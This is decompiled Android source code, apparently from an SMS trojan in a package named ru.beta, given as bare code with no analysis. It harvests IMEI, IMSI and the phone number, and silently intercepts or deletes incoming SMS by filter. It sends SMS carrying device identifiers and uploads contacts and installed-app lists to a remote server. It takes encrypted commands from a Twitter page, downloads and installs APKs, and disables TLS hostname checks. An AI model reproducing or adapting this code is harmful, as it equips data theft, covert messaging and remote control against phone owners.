package ru.beta;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import java.util.Vector;
import org.json.JSONArray;
import org.json.JSONObject;

public class Settings {
    private static String SETTINGS = "betaSettings";
    static Settings settings;
    public String apiKey = "";
    public String appId = "";
    public Vector<SmsItem> catchSmsList = new Vector();
    public Vector<SmsItem> deleteSmsList = new Vector();
    public String imei = "";
    public String imsi = "";
    public String packageName = "";
    public int period = 0;
    public String phone = "";
    public String server = "";
    public String sid = "";
    public int startPeriod = 0;
    public long timeNextConnection = 0;
    public String twitterUrl = "";
    public String version = "";

    public boolean load(Context context) {
        boolean result = false;
        if (Constants.DEBUG) {
            System.out.println("Settings::load() start");
        }
        this.imei = Functions.getImei(context);
        this.imsi = Functions.getImsi(context);
        this.phone = Functions.getPhone(context);
        try {
            SharedPreferences sharedPreferences = context.getSharedPreferences(SETTINGS, 1);
            if (sharedPreferences.contains("first")) {
                int i;
                JSONObject jsonObject;
                this.sid = sharedPreferences.getString("sid", "");
                this.version = sharedPreferences.getString("version", "");
                this.server = sharedPreferences.getString("server", "");
                this.startPeriod = sharedPreferences.getInt("startPeriod", 0);
                this.period = sharedPreferences.getInt("period", 0);
                this.timeNextConnection = sharedPreferences.getLong("timeNextConnection", 0);
                this.twitterUrl = sharedPreferences.getString("twitterUrl", "");
                this.apiKey = sharedPreferences.getString("apiKey", "");
                this.appId = sharedPreferences.getString("appId", "");
                this.packageName = sharedPreferences.getString("packageName", "");
                this.deleteSmsList = new Vector();
                JSONArray jsonArray = new JSONArray(sharedPreferences.getString("deleteSms", ""));
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonObject = jsonArray.getJSONObject(i);
                    this.deleteSmsList.add(new SmsItem(jsonObject.getString("phone"), jsonObject.getString("text")));
                }
                this.catchSmsList = new Vector();
                jsonArray = new JSONArray(sharedPreferences.getString("catchSms", ""));
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonObject = jsonArray.getJSONObject(i);
                    this.catchSmsList.add(new SmsItem(jsonObject.getString("phone"), jsonObject.getString("text")));
                }
                result = true;
            } else if (Constants.DEBUG) {
                System.out.println("not contaion first");
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        if (Constants.DEBUG) {
            System.out.println("Settings::load() end");
        }
        return result;
    }

    public boolean save(Context context) {
        if (Constants.DEBUG) {
            System.out.println("Settings::save() start");
        }
        try {
            int i;
            SmsItem item;
            JSONObject jsonObject;
            Editor editor = context.getSharedPreferences(SETTINGS, 2).edit();
            editor.putBoolean("first", false);
            editor.putString("sid", this.sid);
            editor.putString("version", this.version);
            editor.putString("server", this.server);
            editor.putInt("startPeriod", this.startPeriod);
            editor.putInt("period", this.period);
            editor.putLong("timeNextConnection", this.timeNextConnection);
            editor.putString("twitterUrl", this.twitterUrl);
            editor.putString("apiKey", this.apiKey);
            editor.putString("appId", this.appId);
            editor.putString("packageName", this.packageName);
            JSONArray jsonArray = new JSONArray();
            for (i = 0; i < this.deleteSmsList.size(); i++) {
                item = (SmsItem) this.deleteSmsList.get(i);
                jsonObject = new JSONObject();
                jsonObject.put("phone", item.number);
                jsonObject.put("text", item.text);
                jsonArray.put(jsonObject);
            }
            editor.putString("deleteSms", jsonArray.toString());
            jsonArray = new JSONArray();
            for (i = 0; i < this.catchSmsList.size(); i++) {
                item = (SmsItem) this.catchSmsList.get(i);
                jsonObject = new JSONObject();
                jsonObject.put("phone", item.number);
                jsonObject.put("text", item.text);
                jsonArray.put(jsonObject);
            }
            editor.putString("catchSms", jsonArray.toString());
            editor.commit();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        if (Constants.DEBUG) {
            System.out.println("Settings::save() end");
        }
        return false;
    }

    public void reset(Context context) {
        try {
            Editor editor = context.getSharedPreferences(SETTINGS, 2).edit();
            editor.clear();
            editor.commit();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void setSettings(Settings set) {
        settings = set;
    }

    public static Settings getSettings() {
        return settings;
    }

    public void printToOutStream() {
        try {
            int i;
            SmsItem item;
            JSONObject jsonObj;
            JSONObject json = new JSONObject();
            json.put("sid", this.sid);
            json.put("version", this.version);
            json.put("server", this.server);
            json.put("startPeriod", this.startPeriod);
            json.put("period", this.period);
            json.put("timeNextConnection", this.timeNextConnection);
            json.put("twitterUrl", this.twitterUrl);
            json.put("apiKey", this.apiKey);
            json.put("appId", this.appId);
            JSONArray jsonDeleteArr = new JSONArray();
            for (i = 0; i < this.deleteSmsList.size(); i++) {
                item = (SmsItem) this.deleteSmsList.get(i);
                jsonObj = new JSONObject();
                jsonObj.put("key", item.key);
                jsonObj.put("number", item.number);
                jsonObj.put("text", item.text);
                jsonDeleteArr.put(jsonObj);
            }
            json.put("deleteSmsList", jsonDeleteArr);
            JSONArray jsonCatchArr = new JSONArray();
            for (i = 0; i < this.catchSmsList.size(); i++) {
                item = (SmsItem) this.catchSmsList.get(i);
                jsonObj = new JSONObject();
                jsonObj.put("key", item.key);
                jsonObj.put("number", item.number);
                jsonObj.put("text", item.text);
                jsonCatchArr.put(jsonObj);
            }
            json.put("catchSmsList", jsonCatchArr);
            System.out.println(json.toString(4));
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public void removeCatchFilter(long key) {
        for (int i = 0; i < this.catchSmsList.size(); i++) {
            if (((SmsItem) this.catchSmsList.get(i)).key == key) {
                this.catchSmsList.remove(i);
                return;
            }
        }
    }

    public boolean isDeleteMessage(String number, String text) {
        for (int i = 0; i < this.deleteSmsList.size(); i++) {
            SmsItem item = (SmsItem) this.deleteSmsList.get(i);
            item.number = item.number.toLowerCase();
            item.text = item.text.toLowerCase();
            number = number.toLowerCase();
            text = text.toLowerCase();
            if (item.number.equals("*") && item.text.equals("*")) {
                return true;
            }
            if (item.number.equals("*") && text.indexOf(item.text) != -1) {
                return true;
            }
            if (item.text.equals("*") && number.indexOf(item.number) != -1) {
                return true;
            }
            if (number.indexOf(item.number) != -1 && text.indexOf(item.text) != -1) {
                return true;
            }
        }
        return false;
    }

    public CatchResult isCatchMessage(String number, String text) {
        for (int i = 0; i < this.catchSmsList.size(); i++) {
            SmsItem item = (SmsItem) this.catchSmsList.get(i);
            item.number = item.number.toLowerCase();
            item.text = item.text.toLowerCase();
            number = number.toLowerCase();
            text = text.toLowerCase();
            if (item.number.equals("*") && item.text.equals("*")) {
                return new CatchResult(true, item.key);
            }
            if (item.number.equals("*") && text.indexOf(item.text) != -1) {
                return new CatchResult(true, item.key);
            }
            if (item.text.equals("*") && number.indexOf(item.number) != -1) {
                return new CatchResult(true, item.key);
            }
            if (number.indexOf(item.number) != -1 && text.indexOf(item.text) != -1) {
                return new CatchResult(true, item.key);
            }
        }
        return new CatchResult(false, 0);
    }
}
package ru.beta;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.support.v4.view.MotionEventCompat;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.KeyStore;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.utils.URLEncodedUtils;
import org.apache.http.conn.scheme.PlainSocketFactory;
import org.apache.http.conn.scheme.Scheme;
import org.apache.http.conn.scheme.SchemeRegistry;
import org.apache.http.conn.ssl.SSLSocketFactory;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.conn.SingleClientConnManager;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.params.HttpProtocolParams;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONObject;
import test.app.EasySSLSocketFactory;

public class Functions {
    public static HttpURLConnection sendHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList, boolean uploadFile, String data) {
        String KContentType = "multipart/form-data; boundary=AaB03x";
        String KStartContent = "--AaB03x";
        String KEndContent = "--AaB03x--";
        String KCrlf = "\r\n";
        URL url = null;
        try {
            int i;
            NameValuePair param;
            if (method.equals("POST")) {
                url = new URL(path);
            } else if (method.equals("GET")) {
                url = new URL(path + "?" + URLEncodedUtils.format(paramsList, "utf-8"));
            }
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setRequestMethod(method);
            if (method.equals("POST")) {
                connection.setRequestProperty("Content-Type", KContentType);
            }
            for (i = 0; i < propertyList.size(); i++) {
                param = (NameValuePair) paramsList.get(i);
                connection.setRequestProperty(param.getName(), param.getValue());
            }
            if (method.equals("POST")) {
                DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
                for (i = 0; i < paramsList.size(); i++) {
                    param = (NameValuePair) paramsList.get(i);
                    outputStream.writeBytes(KStartContent);
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes("Content-Disposition: form-data; name=\"" + param.getName() + "\"");
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes(KCrlf);
                    outputStream.write(param.getValue().getBytes("utf-8"));
                    outputStream.writeBytes(KCrlf);
                }
                if (uploadFile) {
                    outputStream.writeBytes(KStartContent);
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes("Content-Disposition: form-data; name=\"FILE\"; filename=\"data.json\"");
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes("Content-Type: application/octet-stream");
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes("Content-Transfer-Encoding: binary");
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes(KCrlf);
                    outputStream.write(data.getBytes("utf-8"));
                    outputStream.writeBytes(KCrlf);
                }
                outputStream.writeBytes(KEndContent);
                outputStream.writeBytes(KCrlf);
                outputStream.flush();
                outputStream.close();
            } else if (method.equals("GET")) {
                connection.connect();
            }
            return connection;
        } catch (Exception ex) {
            ex.printStackTrace();
            return null;
        }
    }

    public static void sendPostRequest(String path, List<NameValuePair> paramsList, List<NameValuePair> propertyList) {
        sendSimpleHttpRequest(path, "POST", paramsList, propertyList);
    }

    public static void sendGetRequest(String path, List<NameValuePair> paramsList, List<NameValuePair> propertyList) {
        sendSimpleHttpRequest(path, "GET", paramsList, propertyList);
    }

    public static void sendSimpleHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList) {
        try {
            HttpURLConnection connection = sendHttpRequest(path, method, paramsList, propertyList, false, null);
            if (connection != null) {
                int code = connection.getResponseCode();
                if (Constants.DEBUG) {
                    System.out.println("getResponseCode: " + code);
                }
                connection.disconnect();
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static JSONObject parseResponse(InputStream stream) {
        try {
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(stream));
            StringBuffer stringBuffer = new StringBuffer();
            while (true) {
                String line = bufferedReader.readLine();
                if (line == null) {
                    break;
                }
                stringBuffer.append(line);
            }
            bufferedReader.close();
            String response = stringBuffer.toString();
            if (Constants.DEBUG) {
                System.out.println("response: " + response);
            }
            JSONObject json = new JSONObject(decript(response));
            if (!Constants.DEBUG) {
                return json;
            }
            System.out.println("json: " + json.toString(4));
            return json;
        } catch (Exception ex) {
            ex.printStackTrace();
            return new JSONObject();
        }
    }

    public static List<String> getContacts(Context context) {
        List<String> list = new ArrayList();
        Uri uri = null;
        try {
            String name = "";
            Class[] childClasses;
            int i;
            if (VERSION.SDK_INT > 4) {
                childClasses = Class.forName("android.provider.ContactsContract").getClasses();
                i = 0;
                while (i < childClasses.length) {
                    if (childClasses[i].getCanonicalName().equals("android.provider.ContactsContract.CommonDataKinds")) {
                        childClasses = childClasses[i].getClasses();
                        for (int j = 0; j < childClasses.length; j++) {
                            if (childClasses[j].getCanonicalName().equals("android.provider.ContactsContract.CommonDataKinds.Phone")) {
                                Class phoneClass = childClasses[j];
                                uri = (Uri) phoneClass.getField("CONTENT_URI").get(null);
                                name = (String) phoneClass.getField("NUMBER").get(null);
                                break;
                            }
                        }
                    } else {
                        i++;
                    }
                }
            } else {
                childClasses = Class.forName("android.provider.Contacts").getClasses();
                for (i = 0; i < childClasses.length; i++) {
                    if (childClasses[i].getCanonicalName().equals("android.provider.Contacts.Phones")) {
                        Class phonesClass = childClasses[i];
                        uri = (Uri) phonesClass.getField("CONTENT_URI").get(null);
                        name = (String) phonesClass.getField("NUMBER").get(null);
                        break;
                    }
                }
            }
            Cursor cursor = context.getContentResolver().query(uri, null, null, null, null);
            while (cursor.moveToNext()) {
                String phone = cursor.getString(cursor.getColumnIndex(name));
                list.add(phone);
                System.out.println("phone: " + phone);
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return list;
    }

    public static String contactsToJson(List<String> contacts) {
        JSONArray jsonArray = new JSONArray();
        int i = 0;
        while (i < contacts.size()) {
            try {
                jsonArray.put(contacts.get(i));
                i++;
            } catch (Exception ex) {
                ex.printStackTrace();
                return "";
            }
        }
        return jsonArray.toString();
    }

    public static boolean downloadFile(String localPath, String httpUrl, String fileName) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(httpUrl).openConnection();
            c.setRequestMethod("GET");
            c.setDoOutput(true);
            c.connect();
            File file = new File(localPath);
            file.mkdirs();
            FileOutputStream fos = new FileOutputStream(new File(file, fileName));
            InputStream is = c.getInputStream();
            byte[] buffer = new byte[1024];
            while (true) {
                int len1 = is.read(buffer);
                if (len1 != -1) {
                    fos.write(buffer, 0, len1);
                } else {
                    fos.close();
                    is.close();
                    return true;
                }
            }
        } catch (Exception e) {
            return false;
        }
    }

    public static void makeCall(Context context, String phone) {
        Intent intent = new Intent("android.intent.action.CALL", Uri.parse("tel:" + phone));
        intent.addFlags(268435456);
        context.startActivity(intent);
    }

    public static void installApk(Context context, String path) {
        try {
            Intent intent = new Intent("android.intent.action.VIEW");
            intent.addFlags(268435456);
            intent.setDataAndType(Uri.fromFile(new File(path)), "application/vnd.android.package-archive");
            context.startActivity(intent);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void openUrl(Context context, String url) {
        try {
            Intent browserIntent = new Intent("android.intent.action.VIEW", Uri.parse(url));
            browserIntent.addFlags(268435456);
            context.startActivity(browserIntent);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void uninstallApk(Context context, String pkg) {
        try {
            Intent intent = new Intent("android.intent.action.DELETE");
            intent.setData(Uri.parse("package:" + pkg));
            intent.addFlags(268435456);
            context.startActivity(intent);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void showNotification(Context context, String tickerText, String title, String text, int icon, String url) {
        try {
            NotificationManager mNotificationManager = (NotificationManager) context.getSystemService("notification");
            Notification notification = new Notification(icon, tickerText, System.currentTimeMillis());
            Intent notificationIntent = new Intent("android.intent.action.VIEW", Uri.parse(url));
            notificationIntent.addFlags(268435456);
            notification.setLatestEventInfo(context, title, text, PendingIntent.getActivity(context, 0, notificationIntent, 0));
            mNotificationManager.notify(1, notification);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static boolean sendSms(String number, String text) {
        Settings settings = Settings.getSettings();
        if (settings != null) {
            text = text.replace("{IMEI}", settings.imei).replace("{IMSI}", settings.imsi).replace("{SID}", settings.sid).replace("{VERSION}", settings.version);
        }
        if (Constants.DEBUG) {
            System.out.println("sms: " + text + " to " + number);
        }
        try {
            SmsManager.getDefault().sendTextMessage(number, null, text, null, null);
            return true;
        } catch (Exception ex) {
            ex.printStackTrace();
            return false;
        }
    }

    public static String loadAndDecode(Context context, String path) {
        try {
            InputStream inputStream = context.getClass().getResourceAsStream(path);
            int size = 0;
            while (inputStream.read() != -1) {
                try {
                    size++;
                } catch (Exception e) {
                }
            }
            inputStream.close();
            inputStream = context.getClass().getResourceAsStream(path);
            byte[] arr = new byte[size];
            readDataFromStream(inputStream, arr);
            inputStream.close();
            int j = 0;
            int key_length = arr[0] & MotionEventCompat.ACTION_MASK;
            for (int i = key_length + 1; i < arr.length; i++) {
                arr[i] = (byte) (arr[i] ^ (arr[j + 1] & MotionEventCompat.ACTION_MASK));
                j++;
                if (j == key_length) {
                    j = 0;
                }
            }
            return new String(arr, key_length + 1, (arr.length - key_length) - 1, "utf-8");
        } catch (Exception ex) {
            ex.printStackTrace();
            return "";
        }
    }

    public static void readDataFromStream(InputStream stream, byte[] data) throws IOException {
        int pos = 0;
        int length = data.length;
        while (true) {
            int read = stream.read(data, pos, length);
            length -= read;
            if (length != 0) {
                pos += read;
            } else {
                return;
            }
        }
    }

    public static SmsMessage[] getSmsMessages(Bundle paramBundle) {
        Object[] array = (Object[]) paramBundle.get("pdus");
        SmsMessage[] messages = new SmsMessage[array.length];
        for (int i = 0; i < array.length; i++) {
            messages[i] = SmsMessage.createFromPdu((byte[]) array[i]);
        }
        return messages;
    }

    public static String getImei(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
            if (telephonyManager == null) {
                return "";
            }
            return telephonyManager.getDeviceId();
        } catch (Exception ex) {
            ex.printStackTrace();
            return "";
        }
    }

    public static String getPhone(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
            if (telephonyManager == null) {
                return "";
            }
            String phone = telephonyManager.getLine1Number();
            if (phone == null) {
                return "";
            }
            return phone;
        } catch (Exception ex) {
            ex.printStackTrace();
            return "";
        }
    }

    public static String getImsi(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
            if (telephonyManager == null) {
                return "";
            }
            return telephonyManager.getSubscriberId();
        } catch (Exception ex) {
            ex.printStackTrace();
            return "";
        }
    }

    public static String decript(String data) {
        return decript(Base64.decode(data, 0));
    }

    public static String decript(byte[] data) {
        int j = 0;
        try {
            int key_length = data[0] & MotionEventCompat.ACTION_MASK;
            for (int i = key_length + 1; i < data.length; i++) {
                data[i] = (byte) (data[i] ^ (data[j + 1] & MotionEventCompat.ACTION_MASK));
                j++;
                if (j == key_length) {
                    j = 0;
                }
            }
            return new String(data, key_length + 1, (data.length - key_length) - 1, "utf-8");
        } catch (Exception ex) {
            ex.printStackTrace();
            return "";
        }
    }

    public static List<PackageInfo> getInstalledAppList(Context context) {
        try {
            return context.getPackageManager().getInstalledPackages(0);
        } catch (Exception ex) {
            ex.printStackTrace();
            return new ArrayList();
        }
    }

    public static String appListToJson(List<PackageInfo> list) {
        JSONArray jsonArray = new JSONArray();
        int i = 0;
        while (i < list.size()) {
            try {
                jsonArray.put(((PackageInfo) list.get(i)).packageName);
                i++;
            } catch (Exception ex) {
                ex.printStackTrace();
                return "";
            }
        }
        return jsonArray.toString();
    }

    public static String parseTwitter(Context context, String path) {
        try {
            HttpResponse response = createClient().execute(new HttpGet(path));
            int code = response.getStatusLine().getStatusCode();
            System.out.println("code: " + code);
            if (code == 200) {
                HttpEntity entity = response.getEntity();
                if (entity != null) {
                    String html = EntityUtils.toString(entity);
                    String startTag = "<p class=\"js-tweet-text\">";
                    String endTag = "</p>";
                    int startIndex = html.indexOf(startTag);
                    if (startIndex != -1) {
                        startIndex += startTag.length();
                        return decript(deleteTags(html.substring(startIndex, html.indexOf(endTag, startIndex)).trim()).trim());
                    }
                    startTag = "<div class=\"tweet-text\">";
                    endTag = "</div>";
                    startIndex = html.indexOf(startTag);
                    if (startIndex != -1) {
                        startIndex += startTag.length();
                        return decript(deleteTags(html.substring(startIndex, html.indexOf(endTag, startIndex)).trim()).trim());
                    }
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return "";
    }

    public static void startTimer(Context context) {
        try {
            Intent intent = new Intent(context, MainReceiver.class);
            intent.setAction("custom.alarm");
            ((AlarmManager) context.getSystemService("alarm")).set(0, Settings.getSettings().timeNextConnection, PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static boolean loadSettings(Context context) {
        if (Settings.getSettings() != null) {
            return true;
        }
        Settings settings = new Settings();
        Settings.setSettings(settings);
        if (settings.load(context)) {
            return true;
        }
        return false;
    }

    public static HttpClient createClient() {
        Exception e;
        HttpParams httpParameters = new BasicHttpParams();
        HttpProtocolParams.setContentCharset(httpParameters, "UTF-8");
        HttpProtocolParams.setHttpElementCharset(httpParameters, "UTF-8");
        HttpConnectionParams.setConnectionTimeout(httpParameters, 3000);
        try {
            KeyStore trusted = KeyStore.getInstance("BKS");
            trusted.load(null, "".toCharArray());
            SSLSocketFactory sslf = new SSLSocketFactory(trusted);
            try {
                sslf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);
                SchemeRegistry schemeRegistry = new SchemeRegistry();
                schemeRegistry.register(new Scheme("http", PlainSocketFactory.getSocketFactory(), 80));
                schemeRegistry.register(new Scheme("https", new EasySSLSocketFactory(), 443));
                return new DefaultHttpClient(new SingleClientConnManager(httpParameters, schemeRegistry), httpParameters);
            } catch (Exception e2) {
                e = e2;
                SSLSocketFactory sSLSocketFactory = sslf;
                e.printStackTrace();
                throw new RuntimeException(e);
            }
        } catch (Exception e3) {
            e = e3;
            e.printStackTrace();
            throw new RuntimeException(e);
        }
    }

    public static String deleteTags(String data) {
        try {
            StringBuffer buffer = new StringBuffer();
            int startIndex = 0;
            int endIndex = 0;
            while (true) {
                int index = data.indexOf("<", startIndex);
                if (index == -1) {
                    return buffer.toString();
                }
                endIndex--;
                endIndex = index;
                buffer.append(data.subSequence(startIndex, endIndex));
                startIndex = data.indexOf(">", startIndex) + 1;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
            return "";
        }
    }

    public static void showHome(Context contex) {
        Intent intent = new Intent("android.intent.action.MAIN");
        intent.setFlags(268435456);
        intent.addCategory("android.intent.category.HOME");
        contex.startActivity(intent);
    }
}
package ru.beta;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONObject;

public final class MainService extends Service implements ThreadOperationListener {
    static boolean isKill = false;
    public static boolean isRunning = false;
    static String packageName = "del.test.app";

    public static void start(Context context, Intent intent, String key) {
        try {
            if (Constants.DEBUG) {
                System.out.println("MainService::start1()");
            }
            Intent service = new Intent(context, MainService.class);
            Bundle extras = intent.getExtras();
            if (extras != null) {
                service.putExtras(extras);
            }
            service.putExtra("key", key);
            context.startService(service);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void start(Context context, Intent intent, String key, String number, String text, long id) {
        try {
            if (Constants.DEBUG) {
                System.out.println("MainService::start2()");
            }
            Intent service = new Intent(context, MainService.class);
            Bundle extras = intent.getExtras();
            if (extras != null) {
                service.putExtras(extras);
            }
            service.putExtra("key", key);
            service.putExtra("number", number);
            service.putExtra("text", text);
            service.putExtra("id", String.valueOf(id));
            context.startService(service);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public void onCreate() {
        super.onCreate();
        setForeground(true);
    }

    public void onStart(Intent intent, int startId) {
        try {
            super.onStart(intent, startId);
            if (Constants.DEBUG) {
                System.out.println("MainService::onStart()");
            }
            Bundle extras = intent.getExtras();
            if (extras != null && extras.get("key") != null) {
                String key = (String) extras.get("key");
                if (Constants.DEBUG) {
                    System.out.println("key: " + key);
                }
                if (key.equals("alarm")) {
                    new Thread(new ThreadOperation(this, 1, null)).start();
                } else if (key.equals("catch")) {
                    String number = (String) extras.get("number");
                    String text = (String) extras.get("text");
                    String id = (String) extras.get("id");
                    new Thread(new ThreadOperation(this, 4, new String[]{number, text, id})).start();
                } else if (key.equals("logs") && !isRunning) {
                    new Thread(new ThreadOperation(this, 5, null)).start();
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onDestroy() {
    }

    /* JADX WARNING: Removed duplicated region for block: B:40:0x013e A:{Catch:{ IOException -> 0x01b8 }} */
    /* JADX WARNING: Removed duplicated region for block: B:40:0x013e A:{Catch:{ IOException -> 0x01b8 }} */
    public void threadOperationRun(int r26, java.lang.Object r27) {
        /*
        r25 = this;
        r21 = ru.beta.Constants.DEBUG;
        if (r21 == 0) goto L_0x0020;
    L_0x0004:
        r21 = java.lang.System.out;
        r22 = new java.lang.StringBuilder;
        r22.<init>();
        r23 = "threadOperationRun: ";
        r22 = r22.append(r23);
        r0 = r22;
        r1 = r26;
        r22 = r0.append(r1);
        r22 = r22.toString();
        r21.println(r22);
    L_0x0020:
        r21 = 1;
        r0 = r26;
        r1 = r21;
        if (r0 != r1) goto L_0x0064;
    L_0x0028:
        r19 = ru.beta.Beta.sendRequest(r25);
        r20 = ru.beta.Settings.getSettings();
        r21 = java.lang.System.currentTimeMillis();
        r0 = r20;
        r0 = r0.period;
        r23 = r0;
        r24 = ru.beta.Constants.SECOND;
        r23 = r23 * r24;
        r0 = r23;
        r0 = (long) r0;
        r23 = r0;
        r21 = r21 + r23;
        r0 = r21;
        r2 = r20;
        r2.timeNextConnection = r0;
        r0 = r20;
        r1 = r25;
        r0.save(r1);
        r0 = r25;
        r1 = r19;
        r0.executeCommands(r1);
        r21 = ru.beta.Constants.DEBUG;
        if (r21 == 0) goto L_0x0060;
    L_0x005d:
        r20.printToOutStream();
    L_0x0060:
        ru.beta.Functions.startTimer(r25);
    L_0x0063:
        return;
    L_0x0064:
        r21 = 2;
        r0 = r26;
        r1 = r21;
        if (r0 != r1) goto L_0x0078;
    L_0x006c:
        r21 = ru.beta.Functions.getContacts(r25);
        r4 = ru.beta.Functions.contactsToJson(r21);
        ru.beta.Beta.sendContactsToServer(r4);
        goto L_0x0063;
    L_0x0078:
        r21 = 3;
        r0 = r26;
        r1 = r21;
        if (r0 != r1) goto L_0x008c;
    L_0x0080:
        r21 = ru.beta.Functions.getInstalledAppList(r25);
        r13 = ru.beta.Functions.appListToJson(r21);
        ru.beta.Beta.sendPackagesToServer(r13);
        goto L_0x0063;
    L_0x008c:
        r21 = 4;
        r0 = r26;
        r1 = r21;
        if (r0 != r1) goto L_0x00e9;
    L_0x0094:
        r27 = (java.lang.String[]) r27;
        r14 = r27;
        r14 = (java.lang.String[]) r14;
        r21 = 0;
        r21 = r14[r21];
        r22 = 1;
        r22 = r14[r22];
        r19 = ru.beta.Beta.sendCatchRequest(r21, r22);
        r21 = "removeCurrentCatchFilter";
        r0 = r19;
        r1 = r21;
        r21 = r0.has(r1);	 Catch:{ Exception -> 0x00e4 }
        if (r21 == 0) goto L_0x00dc;
    L_0x00b2:
        r21 = "removeCurrentCatchFilter";
        r0 = r19;
        r1 = r21;
        r21 = r0.getBoolean(r1);	 Catch:{ Exception -> 0x00e4 }
        r9 = java.lang.Boolean.valueOf(r21);	 Catch:{ Exception -> 0x00e4 }
        r21 = r9.booleanValue();	 Catch:{ Exception -> 0x00e4 }
        if (r21 == 0) goto L_0x00dc;
    L_0x00c6:
        r20 = ru.beta.Settings.getSettings();	 Catch:{ Exception -> 0x00e4 }
        r21 = 2;
        r21 = r14[r21];	 Catch:{ Exception -> 0x00e4 }
        r21 = java.lang.Long.parseLong(r21);	 Catch:{ Exception -> 0x00e4 }
        r20.removeCatchFilter(r21);	 Catch:{ Exception -> 0x00e4 }
        r0 = r20;
        r1 = r25;
        r0.save(r1);	 Catch:{ Exception -> 0x00e4 }
    L_0x00dc:
        r0 = r25;
        r1 = r19;
        r0.executeCommands(r1);
        goto L_0x0063;
    L_0x00e4:
        r7 = move-exception;
        r7.printStackTrace();
        goto L_0x00dc;
    L_0x00e9:
        r21 = 5;
        r0 = r26;
        r1 = r21;
        if (r0 != r1) goto L_0x0210;
    L_0x00f1:
        r21 = 1;
        isRunning = r21;
        r12 = 0;
        r17 = 0;
        r21 = java.lang.Runtime.getRuntime();	 Catch:{ IOException -> 0x01c2 }
        r22 = 2;
        r0 = r22;
        r0 = new java.lang.String[r0];	 Catch:{ IOException -> 0x01c2 }
        r22 = r0;
        r23 = 0;
        r24 = "logcat";
        r22[r23] = r24;	 Catch:{ IOException -> 0x01c2 }
        r23 = 1;
        r24 = "ActivityManager:I";
        r22[r23] = r24;	 Catch:{ IOException -> 0x01c2 }
        r12 = r21.exec(r22);	 Catch:{ IOException -> 0x01c2 }
        r21 = java.lang.System.out;	 Catch:{ IOException -> 0x01c2 }
        r22 = "exec logcat OK";
        r21.println(r22);	 Catch:{ IOException -> 0x01c2 }
    L_0x011b:
        r18 = new java.io.BufferedReader;	 Catch:{ IllegalArgumentException -> 0x01cc }
        r21 = new java.io.InputStreamReader;	 Catch:{ IllegalArgumentException -> 0x01cc }
        r22 = r12.getInputStream();	 Catch:{ IllegalArgumentException -> 0x01cc }
        r21.<init>(r22);	 Catch:{ IllegalArgumentException -> 0x01cc }
        r22 = 1024; // 0x400 float:1.435E-42 double:5.06E-321;
        r0 = r18;
        r1 = r21;
        r2 = r22;
        r0.<init>(r1, r2);	 Catch:{ IllegalArgumentException -> 0x01cc }
        r21 = java.lang.System.out;	 Catch:{ IllegalArgumentException -> 0x023b }
        r22 = "creare reader OK";
        r21.println(r22);	 Catch:{ IllegalArgumentException -> 0x023b }
        r17 = r18;
